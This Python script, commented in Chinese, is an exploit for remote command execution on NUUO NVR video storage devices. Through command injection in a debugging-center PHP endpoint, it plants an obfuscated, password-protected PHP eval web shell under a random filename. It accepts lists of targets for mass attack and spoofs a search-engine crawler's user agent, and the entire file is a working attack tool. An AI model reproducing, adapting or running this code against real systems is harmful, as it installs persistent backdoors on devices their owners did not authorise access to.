import random
import string
import argparse
from user_agent import get_user_agent_pc
import os
import requests
import threading

requests.packages.urllib3.disable_warnings()

MAX_LENGTH = 10
MIN_VARIABLE_NUM = 1
MAX_VARIABLE_NUM = 10
proxy_url = "http://127.0.0.1:10809"
PAYLOAD_CONTENT = [
    "{}='{}<';",
    "{}='{}?php @e';",
    "{}='{}val(';",
    "{}='{}$';",
    """{}="{}_REQUEST['PAYLOAD_PASSWORD']);?>";""",
    "echo -n {}",
    "> {}.{}"
]
resource_path = "/__debugging_center_utils___.php?log=;"
proxies = None
headers = None
timeout = None
delay = None
thread = None


# 1 随机填充内容的生成
# 1.1 使用random库生成随机字符串用于作为随机变量名、随即填充数值和随机文件名
def create_random_variable_name(length: int, is_value: bool = False) -> tuple:
    _start = 0 if is_value else 1
    if length < 1 or length > MAX_LENGTH:
        if is_value:
            length = 1
        else:
            length = 2
    letters = string.ascii_letters
    nums_letters = string.ascii_letters + string.digits
    _prefix = ''.join(random.choice(letters) for _ in range(_start))
    _suffix = ''.join(random.choice(nums_letters) for _ in range(length))
    o = _prefix + _suffix
    return o, length


# 1.2   使用random库生成随机字符串的长度
def create_random_variable_length() -> int:
    return random.randint(MIN_VARIABLE_NUM, MAX_VARIABLE_NUM)


# 2. 构造原始payload
def create_attack_payload(suffix: str = "php") -> tuple:
    # 1. 生成随机变量及其对应数值
    variable_list = dict()
    for _ in range(5):
        var_name, _ = create_random_variable_name(length=create_random_variable_length(), is_value=False)
        var_value, var_value_length = create_random_variable_name(length=create_random_variable_length(), is_value=True)
        variable_list.setdefault(var_name, [var_value, var_value_length])

    # 2. 填充payload内容
    index = 0
    shell = []
    for key, value in variable_list.items():
        PAYLOAD_CONTENT[index] = PAYLOAD_CONTENT[index].format(key, value[0])
        code = "${" + key + ":" + str(value[1]) + "}"
        shell.append(code)
        index = index + 1

    # 3. 填充echo拼接web shell命令
    shell = "".join(shell)
    PAYLOAD_CONTENT[index] = PAYLOAD_CONTENT[index].format(shell)
    index = index + 1

    # payload_content = f"""='123<';="123?php @e";="val(";="$";="TEST_GET['cmd']);?>";"""
    # 4. 生成随机的保存文件名
    filename, _ = create_random_variable_name(length=create_random_variable_length(), is_value=True)
    PAYLOAD_CONTENT[index] = PAYLOAD_CONTENT[index].format(filename, suffix)

    return "".join(PAYLOAD_CONTENT), filename


# 3. 构造随机登录密码的payload
def create_attack_payload_password(suffix: str = "php") -> tuple:
    # 1. 生成payload
    payload, filename = create_attack_payload(suffix)

    # 2. 生成随机登陆密码
    password, _ = create_random_variable_name(create_random_variable_length(), is_value=True)
    payload = payload.replace('PAYLOAD_PASSWORD', password)
    return payload, password, filename


def set_cmd_arg() -> any:
    description = 'NUUO NVR Video Storage Management Device Remote Command Execution'

    parser = argparse.ArgumentParser(description=description, add_help=True)

    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument('-u', '--url', type=str, help='Enter target object')
    targets.add_argument("-f", '--file', type=str, help='Input target object file')

    parser.add_argument('--random-agent', type=bool,
                        required=False, help='Using random user agents')
    parser.add_argument('--time-out', type=int,
                        required=False, help='Set the HTTP access timeout range (setting range from 0 to 5)')
    parser.add_argument('-d', '--delay', type=int,
                        required=False, help='Set multi threaded access latency (setting range from 0 to 5)')
    parser.add_argument('-t', '--thread', type=int,
                        required=False, help='Set the number of program threads (setting range from 1 to 50)')
    parser.add_argument('--proxy', type=str,
                        required=False, help='Set up HTTP proxy')

    args = parser.parse_args()
    return args


def parse_cmd_args(args) -> dict:
    o = dict()
    if args.url is None or not args.url:
        o.setdefault('url', {'type': 'file', 'value': args.file})
    else:
        o.setdefault('url', {'type': 'str', 'value': args.url})

    options = dict()
    if args.random_agent is not None and  args.random_agent:
        user_agent = get_user_agent_pc()
    else:
        user_agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
    options.setdefault('user_agent', user_agent)

    time_out = 1
    base_time_out = random.randint(1, 5)
    if args.time_out is not None:
        if args.time_out < 0 or args.time_out > 5:
            time_out = 0
        else:
            time_out = args.time_out
    options.setdefault('time_out', (base_time_out, base_time_out + time_out))

    options.setdefault('delay', args.delay if args.delay is not None else 0)
    options.setdefault('thread', args.delay if args.thread is not None else 0)
    options.setdefault('proxy', args.proxy if args.proxy is not None else None)

    o.setdefault('options', {"type": "str", "value": options})

    return o


def get_data_from_file(filename: str, mode: str) -> tuple:
    if not os.path.isabs(filename):
        filename = os.path.abspath(os.path.join(os.getcwd(), filename))
    if not os.path.isfile(filename):
        return "405", "{}不是一个合法文件".format(filename)
    if not os.path.exists(filename):
        return "404", "无法找到{}文件".format(filename)
    try:
        content = None
        with open(filename, mode=mode) as f:
            content = f.read().split()
        return "200", content
    except Exception as e:
        return "500", "打开{}文件时发生意料之外的错误".format(filename)


def get_data_brute_list(url_dict: dict) -> dict:
    brute_list = {
        'url': None
    }

    for key, value in url_dict.items():
        _type = value.get("type")
        if _type is None or not _type:
            continue
        if _type == "file":
            _value = value.get("value")
            code, res = get_data_from_file(_value, mode="r")
            if code != "200":
                print(res)
                continue
            brute_list[key] = res
        else:
            brute_list[key] = [value.get('value', None), ]

    return brute_list


def attack(url: str, suffix: str = "php"):
    global proxies, headers, timeout
    global resource_path
    if len(url) <= 0:
        return
    url = url[:-1] if url.endswith("/") else url
    payload, password, filename = create_attack_payload_password(suffix)
    aid = url + resource_path + payload
    try:
        res = requests.get(url=aid, headers=headers, proxies=proxies, timeout=timeout)
        if 400 <= res.status_code:
            print(f"访问{aid}构造web shell出现异常,建议手动访问")
        else:
            print(f"访问{aid}构造web shell成功\n文件名为:{filename}; 文件密码为{password}\nweb shell可能存在路径{url+'/'+filename+'.'+suffix}")
    except Exception as e:
        print(e)
        print(f"访问{aid}构造web shell出现异常,建议手动访问/使用代理访问")


def task(url_dict: dict) -> None:
    global proxies, headers, timeout, delay, thread
    brute_list = get_data_brute_list(url_dict)
    urls = brute_list.get('url', None)
    options = brute_list.get('options', None)[0]

    proxy = options.get('proxy', None)
    if proxy is None or not proxy:
        proxy = None
    else:
        os.environ['http_proxy'] = proxy

    proxies = {
        'http': proxy
    }

    headers = {
        "User-Agent": options.get('user_agent', None)
    }

    timeout = options.get('time_out', None)
    delay = options.get('delay', None)
    thread = options.get('thread', None)

    for url in urls:
        attack(url)


def main() -> None:
    args = set_cmd_arg()
    obj = parse_cmd_args(args)
    task(obj)


if __name__ == '__main__':
    main()
